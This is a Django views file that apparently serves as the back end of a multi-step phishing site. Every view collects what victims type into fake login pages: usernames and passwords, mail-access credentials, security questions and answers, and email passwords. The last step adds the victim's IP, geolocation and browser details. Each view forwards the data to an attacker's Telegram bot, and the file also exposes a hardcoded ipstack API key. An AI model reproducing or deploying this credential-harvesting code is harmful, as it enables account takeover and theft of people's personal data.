from django.shortcuts import render, redirect
from django.conf import settings
import requests
import datetime
from django.core.mail import EmailMultiAlternatives
import time

def visitor_ip_address(request):

    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')

    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def get_geolocation_for_ip(ip):
    url = f"http://api.ipstack.com/{ip}?access_key=67c29f7330c075f5382be0d5c896abed"
    response = requests.get(url)
    response.raise_for_status()
    return response.json()

def login(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        }

        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)

        result = r.json()

        if result["success"]:

            USERNAME1 = request.POST["username_step1"]
            PASSWORD1 = request.POST["password_step1"]
            USERNAME2 = request.POST["ns1"]
            PASSWORD2 = request.POST["password"]

            payload = f"""|---> POP <---|
------------------------------------
Login Time : {datetime.datetime.now()}
------------------------------------
Login Info :
Login Step 1 => {USERNAME1}:{PASSWORD1}
Login Step 2 => {USERNAME2}:{PASSWORD2}
------------------------------------"""


            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)

            return redirect("base:mailAccess")
        return render(request, "base/login.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }

        return render(request, "base/login.html", context)



def get_mail_access(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        }

        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)

        result = r.json()

        if result["success"]:

            MAIL_ACCESS1 = request.POST["MailAccess_step1"]
            PASSWORD_ACCESS1 = request.POST["PasswordAccess_step1"]
            MAIL_ACCESS2 = request.POST["ns1"]
            PASSWORD_ACCESS2 = request.POST["password"]

            payload = f"""|---> gillp <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Mail Access Info :
Mail Access Step 1 => {MAIL_ACCESS1}:{PASSWORD_ACCESS1}
Mail Access Step 2=> {MAIL_ACCESS2}:{PASSWORD_ACCESS2}
------------------------------------"""

            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)

            return redirect("base:lop_lop")
        return render(request, "base/pop_pop.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }

        return render(request, "base/pop_pop.html", context)


def lop_lop(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        }

        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)

        result = r.json()

        if result["success"]:

            QUESTION_1 = request.POST["q1"]
            ANSWER_1 = request.POST["ans1"]
            QUESTION_2 = request.POST["q2"]
            ANSWER_2 = request.POST["ans2"]
            QUESTION_3 = request.POST["q3"]
            ANSWER_3 = request.POST["ans3"]

            payload = f"""|---> Pers <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Personal Info:
QUESTION1 => {QUESTION_1}
ANSWER1 => {ANSWER_1}
QUESTION2 => {QUESTION_2}
ANSWER2 => {ANSWER_2}
QUESTION3 => {QUESTION_3}
ANSWER3 => {ANSWER_3}

------------------------------------"""

            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)

            return redirect("base:col_col")
        return render(request, "base/lop_lop.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }

        return render(request, "base/lop_lop.html", context)


def col_col(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        }

        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)

        result = r.json()

        if result["success"]:

            EMAIL = request.POST["email"]
            EMAILPASS = request.POST["emailpass"]

            IP = visitor_ip_address(request)
            NEW_DATA = get_geolocation_for_ip(IP)
            COUNTRY = NEW_DATA["country_name"]
            CONTINENT_NAME = NEW_DATA["continent_name"]
            REGION_NAME = NEW_DATA['region_name']
            CITY_NAME = NEW_DATA["city"]
            USER_AGENT = request.POST["user_agent"]
            BROWSER_NAME = request.POST["browser_name"]
            BROWSER_VERSION = request.POST["browser_version"]
            LANGUAGES = request.POST["languages"]

            payload = f"""|---> col_col <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Card Info :

Step 1 :
EMAIL ADDRESS : {EMAIL}
EMAIL PASS : {EMAILPASS}
------------------------------------
Client Private Information :
IP Address : {IP}
User Agent : {USER_AGENT}
Languages : {LANGUAGES}
Browser Name : {BROWSER_NAME}
Browser Version : {BROWSER_VERSION}
Country : {COUNTRY}
Continent Name : {CONTINENT_NAME}
Region Name : {REGION_NAME}
City : {CITY_NAME}
------------------------------------"""

            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)

            return redirect("base:success_yay")
        return render(request, "base/col_col.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }

        return render(request, "base/col_col.html", context)

def success_yay(request) :
    return render(request, "base/success_yay.html")